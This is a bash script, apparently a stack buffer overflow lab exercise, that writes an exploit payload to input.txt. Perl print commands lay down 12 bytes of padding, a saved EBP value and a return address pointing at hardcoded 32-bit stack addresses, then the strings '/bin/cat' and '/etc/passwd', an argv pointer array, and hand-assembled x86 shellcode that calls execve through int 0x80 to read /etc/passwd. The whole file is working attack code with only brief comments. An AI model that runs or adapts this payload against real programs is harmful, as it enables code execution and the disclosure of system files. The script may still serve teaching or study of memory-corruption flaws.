#!/bin/bash

# write 12 'A's to buff and its padding
perl -e 'print "A"x12;' > input.txt

# write value 0xbffffe68 to the saved EBP, to preserve the old EBP (actually not necessary)
perl -e 'print "\x68\xfe\xff\xbf";' >> input.txt 

# write new return address 0xbfffe84
perl -e 'print "\x84\xfe\xff\xbf";' >> input.txt

# write "/bin/cat" and one \0 and three padding to stack
perl -e 'print "/bin/cat\0\x00\x00\x00";' >> input.txt

# write "/etc/passwd" and one \0 to stack
perl -e 'print "/etc/passwd\0";' >> input.txt

# write "/bin/cat"'s address to stack
perl -e 'print "\x60\xfe\xff\xbf";' >> input.txt

# write "/etc/passwd"'s address to stack
perl -e 'print "\x6c\xfe\xff\xbf";' >> input.txt

# write a NULL pointer to stack
perl -e 'print "\x00\x00\x00\x00";' >> input.txt

# inject "xorl %eax, %eax"
perl -e 'print "\x31\xc0";' >> input.txt

# inject "movl $0xb, %eax"
perl -e 'print "\xb0\x0b";' >> input.txt

# inject "movl $0xbffffe60,%ebx"
perl -e 'print "\xbb\x60\xfe\xff\xbf";' >> input.txt

# inject "movl $0xbffffe78,%ecx"
perl -e 'print "\xb9\x78\xfe\xff\xbf";' >> input.txt

# inject "movl $0xbffffe80,%edx"
perl -e 'print "\xba\x80\xfe\xff\xbf";' >> input.txt

# inject "int $0x80"
perl -e 'print "\xcd\x80";' >> input.txt